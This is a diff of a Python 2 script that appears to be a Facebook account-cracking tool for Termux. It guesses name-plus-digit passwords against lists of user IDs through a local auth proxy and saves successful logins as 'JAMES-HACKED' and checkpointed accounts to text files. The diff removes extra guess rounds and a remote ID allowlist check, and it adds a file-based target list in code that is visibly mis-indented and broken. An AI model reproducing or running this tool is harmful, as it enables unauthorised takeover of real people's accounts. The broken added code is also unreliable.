@@ -63,13 +63,12 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/Freedom-Fighter/main/id.txt').text
-    if to in r:
-        os.system('cd ..... && npm install')
-        os.system('fuser -k 5000/tcp &')
-        os.system('#')
-        os.system('cd ..... && node index.js &')
-        time.sleep(5)
+    if not os.path.isfile("/data/data/com.termux/files/home/tsst/...../node_modules/bytes/index.js"):
+    os.system("cd ..... && npm install")
+    os.system("fuser -k 5000/tcp &")
+    os.system("#")
+    os.system("cd ..... && node index.js &")
+    time.sleep(5)
         ip()
     else:
         os.system('clear')
@@ -128,13 +127,10 @@ def ip():
 
     print '\033[1;93m Your ip: ' + ips
     time.sleep(2)
-    print ''
     print '\033[1;93m Your country: ' + country
     time.sleep(2)
-    print ''
     print '\033[1;92m Your region: ' + regi
     time.sleep(2)
-    print ''
     print ' \033[1;92mYour network: ' + network
     time.sleep(1)
     print ''
@@ -152,7 +148,7 @@ def log_menu():
         os.system('clear')
         print logo
         print ''
-        print '\033[1;31;1m~~~~ Login menu~~~~'
+        print '\033[1;31;1m~~~~ Login menu ~~~~'
         print ''
         print '\033[1;92m[1] Login with FaceBook'
         print '\033[1;92m[2] Login with token'
@@ -388,8 +384,6 @@ def a_s():
         print ''
         p1 = raw_input(' \033[1;92m[1]Name + digit: ')
         p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -427,8 +421,6 @@ def a_s():
         print ''
         p1 = raw_input(' \033[1;92m[1]Name + digit: ')
         p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -454,6 +446,20 @@ def a_s():
             na = i['name']
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
+        
+    elif a_s == '3':
+        os.system('clear')
+        print logo
+        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+		try:
+	                uidlist = raw_input('[+] File Name: ')
+			        print " ----------------------------------------------- "
+	                for line in open(uidlist ,'r').readlines():
+	                    id.append(line.strip())
+		except (KeyError , IOError):
+	            print "    [!] File Not Found."
+	            raw_input('Press Enter To Back. ')
+		        auto_crack()
         
     elif a_s == '0':
         menu()
@@ -510,38 +516,6 @@ def a_s():
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
-                else:
-                    pass3 = name.lower() + p3
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
-                    q = json.loads(data)
-                    if 'loc' in q:
-                        print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
-                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass3 + '\n')
-                        ok.close()
-                        oks.append(uid + pass3)
-                    elif 'www.facebook.com' in q['error']:
-                        print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass3
-                        cp = open('HOP_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass3 + '\n')
-                        cp.close()
-                        cps.append(uid + pass3)
-                    else:
-                        pass4 = name.lower() + p4
-                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
-                        q = json.loads(data)
-                        if 'loc' in q:
-                            print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
-                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
-                            ok.write(uid + ' | ' + pass4 + '\n')
-                            ok.close()
-                            oks.append(uid + pass4)
-                        elif 'www.facebook.com' in q['error']:
-                            print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass4
-                            cp = open('HOP_CP.txt', 'a')
-                            cp.write(uid + ' | ' + pass4 + '\n')
-                            cp.close()
-                            cps.apppend(uid + pass4)
         except:
             pass
         
@@ -599,8 +573,6 @@ def c_s():
         print ''
         pass1 = raw_input(' \033[1;92m[1]Password: ')
         pass2 = raw_input(' \033[1;92m[2]Password: ')
-        pass3 = raw_input(' \033[1;92m[3]Password: ')
-        pass4 = raw_input(' \033[1;92m[4]Password: ')
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -636,8 +608,6 @@ def c_s():
         print ''
         pass1 = raw_input(' \033[1;92m[1]Password: ')
         pass2 = raw_input(' \033[1;92m[2]Password: ')
-        pass3 = raw_input(' \033[1;92m[3]Password: ')
-        pass4 = raw_input(' \033[1;92m[4]Password: ')
         idt = raw_input(' \033[1;93mEnter id: ')
         
         try:
@@ -664,6 +634,20 @@ def c_s():
             na = i['name']
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
+            
+    elif a_s == '3':
+        os.system('clear')
+        print logo
+        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+		try:
+	                uidlist = raw_input('[+] File Name: ')
+			        print " ----------------------------------------------- "
+	                for line in open(uidlist ,'r').readlines():
+	                    id.append(line.strip())
+		except (KeyError , IOError):
+	            print "    [!] File Not Found."
+	            raw_input('Press Enter To Back. ')
+		        auto_crack()
         
     elif a_s == '0':
         menu()
@@ -718,36 +702,6 @@ def c_s():
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
-                else:
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
-                    q = json.loads(data)
-                    if 'loc' in q:
-                        print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
-                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass3 + '\n')
-                        ok.close()
-                        oks.append(uid + pass3)
-                    elif 'www.facebook.com' in q['error']:
-                        print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass3
-                        cp = open('HOP_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass3 + '\n')
-                        cp.close()
-                        cps.append(uid + pass3)
-                    else:
-                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
-                        q = json.loads(data)
-                        if 'loc' in q:
-                            print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
-                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
-                            ok.write(uid + ' | ' + pass4 + '\n')
-                            ok.close()
-                            oks.append(uid + pass4)
-                        elif 'www.facebook.com' in q['error']:
-                            print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass4
-                            cp = open('HOP_CP.txt', 'a')
-                            cp.write(uid + ' | ' + pass4 + '\n')
-                            cp.close()
-                            cps.apppend(uid + pass4)
         except:
             pass
         
